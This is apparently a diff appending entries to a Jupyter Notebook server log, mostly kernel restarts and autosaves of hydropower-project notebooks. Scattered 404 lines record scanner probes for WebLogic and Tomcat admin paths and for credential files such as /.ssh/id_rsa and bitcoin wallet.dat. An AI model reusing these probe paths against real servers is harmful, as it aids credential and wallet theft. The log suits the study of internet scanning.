@@ -342,3 +342,925 @@ Xlib:  extension "XInputExtension" missing on display ":1.0".
 [I 18:24:33.919 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
 [I 18:24:34.678 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
 [I 18:26:21.220 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 18:39:43.872 NotebookApp] Kernel restarted: 54685d48-a53d-49b7-8843-cccd61a96866
+[I 18:39:44.614 NotebookApp] Adapting to protocol v5.1 for kernel 54685d48-a53d-49b7-8843-cccd61a96866
+[I 19:04:05.088 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.r2.ipynb
+[I 19:32:03.700 NotebookApp] 302 GET / (200.148.59.235) 0.75ms
+[W 20:06:44.616 NotebookApp] WebSocket ping timeout after 119970 ms.
+[W 20:07:04.679 NotebookApp] WebSocket ping timeout after 119909 ms.
+[W 20:07:06.568 NotebookApp] WebSocket ping timeout after 119788 ms.
+[I 20:35:28.011 NotebookApp] 302 GET / (177.103.109.100) 0.62ms
+[I 20:56:07.865 NotebookApp] 302 GET / (45.5.209.254) 0.50ms
+[I 21:27:40.181 NotebookApp] 302 GET / (191.242.246.238) 0.51ms
+[W 21:46:08.657 NotebookApp] 404 GET /is_test (186.235.193.22) 1.53ms referer=None
+[W 21:47:15.009 NotebookApp] 404 GET /w00tw00t.at.ISC.SANS.DFind:) (189.126.119.4) 1.36ms referer=None
+[I 23:09:29.444 NotebookApp] 302 GET / (71.6.146.130) 0.50ms
+[I 23:09:29.821 NotebookApp] 302 GET /tree (71.6.146.130) 0.70ms
+[I 23:19:22.957 NotebookApp] 302 GET / (104.211.213.210) 0.47ms
+[I 23:19:23.231 NotebookApp] 302 GET /tree? (104.211.213.210) 0.73ms
+[I 00:04:22.239 NotebookApp] 302 GET / (74.82.47.5) 0.52ms
+[I 00:26:53.696 NotebookApp] 302 GET / (103.197.146.19) 0.63ms
+[W 00:56:15.652 NotebookApp] 404 GET /bea_wls_deployment_internal (107.170.193.70) 1.85ms referer=None
+[W 00:56:15.963 NotebookApp] 404 GET /bea_wls_deployment_internal (107.170.193.70) 1.53ms referer=None
+[I 01:20:51.708 NotebookApp] 302 GET / (61.247.177.230) 0.62ms
+[W 02:53:34.985 NotebookApp] 404 GET /manager/html (205.209.128.218) 1.72ms referer=None
+[I 03:01:47.706 NotebookApp] 302 GET / (177.130.245.106) 0.46ms
+[I 04:26:59.876 NotebookApp] 302 GET / (170.84.147.93) 0.48ms
+[I 04:32:26.798 NotebookApp] Adapting to protocol v5.1 for kernel 54685d48-a53d-49b7-8843-cccd61a96866
+[I 04:32:47.597 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 04:32:49.573 NotebookApp] Adapting to protocol v5.1 for kernel 659633e3-4083-4a34-9427-48700676a17b
+[W 04:48:18.218 NotebookApp] 404 GET /bea_wls_deployment_internal (47.99.141.77) 1.59ms referer=None
+[W 04:48:19.784 NotebookApp] 404 GET /bea_wls_deployment_internal (47.99.141.77) 1.51ms referer=None
+[I 04:58:52.474 NotebookApp] 302 GET / (41.50.74.84) 0.64ms
+[W 05:02:26.800 NotebookApp] WebSocket ping timeout after 117974 ms.
+[W 05:13:32.414 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20181014113501 (80.254.184.33) 1.47ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.SetupBasemaps.ipynb
+[W 05:13:32.511 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20181014113501 (80.254.184.33) 1.54ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/NamTheun1.r8.ipynb
+[W 05:13:32.570 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20181014113501 (80.254.184.33) 1.80ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.SetupBasemaps.r2.ipynb
+[W 05:13:32.763 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20181014113501 (80.254.184.33) 1.84ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 05:14:01.640 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 05:14:31.561 NotebookApp] Kernel started: 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 05:14:33.171 NotebookApp] Adapting to protocol v5.1 for kernel 54685d48-a53d-49b7-8843-cccd61a96866
+[I 05:14:34.948 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 05:14:38.692 NotebookApp] Kernel started: 992e6179-0a4d-43b1-96b8-1eb0c98e2477
+[I 05:14:41.568 NotebookApp] Adapting to protocol v5.1 for kernel 992e6179-0a4d-43b1-96b8-1eb0c98e2477
+[W 05:15:16.556 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20181014113501 (80.254.184.33) 1.59ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 05:15:47.379 NotebookApp] Kernel started: 7d707769-7fa0-4016-bca7-ebbd158e52ed
+[I 05:15:48.397 NotebookApp] Adapting to protocol v5.1 for kernel 7d707769-7fa0-4016-bca7-ebbd158e52ed
+[I 05:16:05.358 NotebookApp] Adapting to protocol v5.1 for kernel 659633e3-4083-4a34-9427-48700676a17b
+[I 05:16:51.707 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[W 05:16:52.508 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20181014113501 (80.254.184.33) 2.51ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.SetupBasemaps.ipynb
+[W 05:31:21.709 NotebookApp] WebSocket ping timeout after 119972 ms.
+[W 05:31:31.641 NotebookApp] WebSocket ping timeout after 119788 ms.
+[W 05:31:33.173 NotebookApp] WebSocket ping timeout after 119891 ms.
+[W 05:31:34.950 NotebookApp] WebSocket ping timeout after 119918 ms.
+[W 05:31:35.360 NotebookApp] WebSocket ping timeout after 119922 ms.
+[W 05:31:41.570 NotebookApp] WebSocket ping timeout after 119886 ms.
+[W 05:31:48.399 NotebookApp] WebSocket ping timeout after 119965 ms.
+[I 07:16:28.524 NotebookApp] 302 GET / (103.79.156.31) 0.62ms
+[W 07:34:11.888 NotebookApp] 404 GET http://179.35.240.62:8842/euchsrgzwcoi3rh2n2z518hfpgckemt4 (77.247.182.242) 1.64ms referer=None
+[W 07:47:19.447 NotebookApp] 404 GET /bea_wls_deployment_internal (120.78.249.137) 1.48ms referer=None
+[W 07:47:20.228 NotebookApp] 404 GET /bea_wls_deployment_internal (120.78.249.137) 1.50ms referer=None
+[I 08:09:44.766 NotebookApp] 302 GET / (109.189.9.185) 0.58ms
+[I 08:43:21.269 NotebookApp] 302 GET / (187.113.74.171) 0.59ms
+[W 10:25:02.178 NotebookApp] 404 GET /bea_wls_deployment_internal (91.121.167.76) 1.94ms referer=None
+[W 10:25:02.230 NotebookApp] 404 GET /bea_wls_deployment_internal (91.121.167.76) 1.48ms referer=None
+[I 10:41:44.732 NotebookApp] 302 GET / (179.113.31.67) 0.64ms
+[I 12:20:58.856 NotebookApp] 302 GET / (36.68.128.33) 0.57ms
+[W 12:27:16.726 NotebookApp] 404 GET /bea_wls_deployment_internal (128.0.31.26) 1.60ms referer=None
+[W 12:30:13.142 NotebookApp] 404 GET http://5.188.210.12/echo.php (5.188.210.12) 1.72ms referer=https://www.google.com/
+[I 13:10:23.210 NotebookApp] 302 GET / (186.251.11.194) 0.48ms
+[W 13:34:31.606 NotebookApp] 404 GET /is_test (209.141.56.223) 1.48ms referer=None
+[I 15:28:58.089 NotebookApp] 302 GET / (201.68.42.122) 0.52ms
+[I 15:37:37.125 NotebookApp] 302 GET / (200.141.130.134) 0.61ms
+[W 15:54:58.686 NotebookApp] 404 GET /manager/html (46.37.21.50) 1.49ms referer=None
+[I 16:21:44.953 NotebookApp] 302 GET / (71.6.232.4) 0.49ms
+[I 16:25:31.638 NotebookApp] 302 GET / (201.93.250.183) 0.54ms
+[W 17:19:34.518 NotebookApp] 404 GET /manager/html (185.144.82.233) 1.62ms referer=None
+[I 17:30:53.113 NotebookApp] 302 GET / (152.250.52.213) 0.63ms
+[I 18:40:04.535 NotebookApp] 302 GET / (143.0.246.58) 0.53ms
+[I 18:42:12.081 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 18:42:22.986 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 18:42:23.986 NotebookApp] Adapting to protocol v5.1 for kernel 54685d48-a53d-49b7-8843-cccd61a96866
+[I 18:42:25.998 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 18:42:26.962 NotebookApp] Adapting to protocol v5.1 for kernel 659633e3-4083-4a34-9427-48700676a17b
+[I 18:42:32.968 NotebookApp] Adapting to protocol v5.1 for kernel 992e6179-0a4d-43b1-96b8-1eb0c98e2477
+[I 18:43:41.979 NotebookApp] Adapting to protocol v5.1 for kernel 7d707769-7fa0-4016-bca7-ebbd158e52ed
+[I 19:08:58.157 NotebookApp] 302 GET / (39.7.52.163) 0.49ms
+[I 19:36:17.398 NotebookApp] 302 GET / (188.138.90.14) 0.58ms
+[W 19:42:22.987 NotebookApp] WebSocket ping timeout after 119804 ms.
+[W 19:42:23.987 NotebookApp] WebSocket ping timeout after 119972 ms.
+[W 19:42:25.999 NotebookApp] WebSocket ping timeout after 119771 ms.
+[W 19:42:26.963 NotebookApp] WebSocket ping timeout after 119915 ms.
+[W 19:42:32.969 NotebookApp] WebSocket ping timeout after 119778 ms.
+[W 19:42:41.980 NotebookApp] WebSocket ping timeout after 119880 ms.
+[W 19:42:42.082 NotebookApp] WebSocket ping timeout after 119972 ms.
+[I 21:27:33.400 NotebookApp] 302 GET / (200.158.169.173) 0.70ms
+[I 21:27:33.406 NotebookApp] 302 GET / (200.158.169.173) 0.43ms
+[I 22:04:34.703 NotebookApp] 302 GET / (200.153.217.241) 0.55ms
+[W 22:19:59.620 NotebookApp] 404 GET /wallet.dat (188.138.90.14) 1.66ms referer=None
+[W 23:09:29.202 NotebookApp] 404 GET /bea_wls_deployment_internal (159.122.146.123) 1.55ms referer=None
+[W 23:09:30.225 NotebookApp] 404 GET /bea_wls_deployment_internal (159.122.146.123) 1.59ms referer=None
+[I 23:11:44.573 NotebookApp] 302 GET / (62.240.181.3) 0.50ms
+[W 23:13:51.781 NotebookApp] 404 GET /wallets/wallet.dat (188.138.90.14) 1.88ms referer=None
+[I 23:40:57.545 NotebookApp] 302 GET / (95.233.128.127) 0.62ms
+[I 00:06:16.433 NotebookApp] 302 GET / (74.82.47.5) 0.47ms
+[I 00:32:24.156 NotebookApp] 302 GET / (189.47.80.48) 0.59ms
+[W 01:14:11.882 NotebookApp] 404 GET /.bitcoin/wallet.dat (188.138.90.14) 1.66ms referer=None
+[I 01:34:28.209 NotebookApp] 302 GET / (178.72.159.254) 0.49ms
+[I 01:54:20.716 NotebookApp] 302 GET / (180.122.130.29) 0.52ms
+[I 03:12:20.738 NotebookApp] 302 GET / (143.255.242.114) 0.50ms
+[W 03:14:19.121 NotebookApp] 404 GET /.bitcoin/wallets/wallet.dat (188.138.90.14) 1.50ms referer=None
+[I 03:15:56.952 NotebookApp] 302 GET / (45.71.151.62) 0.50ms
+[I 04:25:35.811 NotebookApp] 302 GET / (47.52.59.164) 0.67ms
+[I 04:25:41.788 NotebookApp] 302 GET /tree? (47.52.59.164) 0.89ms
+[I 04:32:41.225 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 04:32:41.294 NotebookApp] Adapting to protocol v5.1 for kernel 54685d48-a53d-49b7-8843-cccd61a96866
+[I 04:32:49.220 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 04:32:50.182 NotebookApp] Adapting to protocol v5.1 for kernel 659633e3-4083-4a34-9427-48700676a17b
+[I 04:32:56.196 NotebookApp] Adapting to protocol v5.1 for kernel 992e6179-0a4d-43b1-96b8-1eb0c98e2477
+[I 04:33:05.190 NotebookApp] Adapting to protocol v5.1 for kernel 7d707769-7fa0-4016-bca7-ebbd158e52ed
+[I 04:33:05.260 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 04:42:13.797 NotebookApp] 302 GET / (185.53.91.26) 0.46ms
+[I 04:42:13.841 NotebookApp] 302 GET /tree? (185.53.91.26) 0.73ms
+[I 04:42:14.199 NotebookApp] 302 GET / (185.53.91.26) 0.59ms
+[I 04:42:14.239 NotebookApp] 302 GET /tree? (185.53.91.26) 0.75ms
+[I 04:42:14.364 NotebookApp] 302 GET / (185.53.91.26) 0.46ms
+[I 04:42:14.404 NotebookApp] 302 GET /tree? (185.53.91.26) 0.74ms
+[W 04:49:05.191 NotebookApp] WebSocket ping timeout after 119761 ms.
+[W 04:49:05.261 NotebookApp] WebSocket ping timeout after 119832 ms.
+[W 04:49:11.226 NotebookApp] WebSocket ping timeout after 119852 ms.
+[W 04:49:11.295 NotebookApp] WebSocket ping timeout after 119921 ms.
+[W 04:49:19.221 NotebookApp] WebSocket ping timeout after 119864 ms.
+[W 04:49:20.183 NotebookApp] WebSocket ping timeout after 119906 ms.
+[W 04:49:26.197 NotebookApp] WebSocket ping timeout after 119879 ms.
+[W 05:29:19.489 NotebookApp] 404 GET /bea_wls_deployment_internal (120.25.67.89) 1.65ms referer=None
+[W 05:29:20.486 NotebookApp] 404 GET /bea_wls_deployment_internal (120.25.67.89) 1.62ms referer=None
+[W 05:31:56.927 NotebookApp] 404 GET /manager/html (221.229.162.34) 1.47ms referer=None
+[I 06:18:13.844 NotebookApp] 302 GET / (38.87.236.202) 0.66ms
+[I 06:27:46.188 NotebookApp] 302 GET / (178.151.179.88) 0.50ms
+[I 06:37:40.696 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 06:37:41.704 NotebookApp] Adapting to protocol v5.1 for kernel 659633e3-4083-4a34-9427-48700676a17b
+[I 06:37:47.699 NotebookApp] Adapting to protocol v5.1 for kernel 992e6179-0a4d-43b1-96b8-1eb0c98e2477
+[I 06:46:29.701 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 06:46:29.766 NotebookApp] Adapting to protocol v5.1 for kernel 54685d48-a53d-49b7-8843-cccd61a96866
+[I 06:46:30.666 NotebookApp] Adapting to protocol v5.1 for kernel 7d707769-7fa0-4016-bca7-ebbd158e52ed
+[I 06:46:42.791 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 07:51:18.616 NotebookApp] 302 GET / (177.105.245.144) 0.47ms
+[W 08:03:55.229 NotebookApp] 404 GET /.ssh/id_rsa (188.138.90.14) 1.59ms referer=None
+[I 08:30:32.090 NotebookApp] 302 GET / (88.146.209.22) 0.53ms
+[I 09:16:30.569 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:18:30.616 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:20:30.467 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:22:30.417 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:22:45.197 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:24:12.945 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:24:30.650 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:24:51.338 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 09:24:52.132 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 09:26:30.443 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:26:38.332 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:28:05.065 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:30:30.431 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:30:33.102 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:32:06.096 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:32:14.945 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:34:30.421 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:36:30.413 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:37:51.854 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:38:02.292 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:38:30.454 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:38:39.750 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:39:11.661 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:39:33.300 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:39:40.971 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:40:30.435 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:41:35.579 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:41:52.171 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 09:41:52.847 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 09:42:30.414 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:44:30.408 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:46:30.668 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:46:32.271 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:46:33.924 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:48:29.141 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:49:33.164 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:49:56.393 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:50:31.172 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:52:30.441 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:52:52.746 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:53:43.592 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:53:48.657 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 09:53:49.350 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 09:54:30.423 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:56:30.659 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:56:40.645 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 09:58:30.427 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:00:30.432 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:01:06.371 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:01:55.986 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:15:44.090 NotebookApp] 302 GET / (139.162.79.87) 0.62ms
+[I 10:20:04.201 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:20:30.454 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:20:48.466 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:21:53.844 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:22:04.673 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:22:05.620 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:22:06.198 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:24:03.642 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:24:30.449 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:25:41.429 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:26:08.516 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:26:30.518 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:27:05.426 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:28:30.515 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:31:41.051 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:32:30.415 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:34:30.426 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:35:56.595 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:36:30.560 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:38:30.513 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:38:35.645 NotebookApp] 302 GET / (81.182.250.68) 0.55ms
+[I 10:39:09.991 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:42:30.407 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:43:21.540 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:43:53.257 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:44:30.409 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:44:58.975 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:46:20.565 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:46:30.408 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:47:45.324 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:48:09.423 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:48:30.453 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:48:33.907 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:49:19.544 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:49:33.413 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 10:49:34.193 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 10:50:09.197 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:50:30.297 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:50:32.797 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 10:51:05.300 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:01:59.946 NotebookApp] 302 GET / (187.57.45.8) 0.69ms
+[I 11:19:48.391 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:20:30.324 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:20:33.129 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:21:21.575 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:22:25.085 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:23:03.501 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:23:18.215 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:24:30.292 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:26:30.297 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:28:21.649 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:28:30.291 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:29:06.859 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 11:29:07.618 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 11:29:46.401 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:32:30.295 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:34:30.391 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:36:30.319 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:37:57.693 NotebookApp] 302 GET / (88.107.14.70) 0.62ms
+[I 11:38:30.446 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:40:30.642 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:41:59.279 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:42:30.612 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:43:52.167 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:44:30.475 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:44:45.195 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:45:26.874 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 11:45:27.673 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 11:46:30.804 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:48:30.497 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
